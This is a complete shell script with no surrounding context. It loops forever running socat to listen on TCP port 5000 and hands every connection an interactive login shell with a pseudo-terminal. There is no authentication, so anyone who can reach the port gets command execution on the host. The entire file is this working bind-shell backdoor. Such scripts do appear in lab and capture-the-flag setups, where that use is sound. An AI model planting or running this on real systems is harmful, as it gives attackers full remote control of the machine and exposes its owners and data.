#!/bin/sh

while true
do
    socat tcp-listen:5000,reuseaddr system:'/bin/sh -li',pty,stderr,sane
done
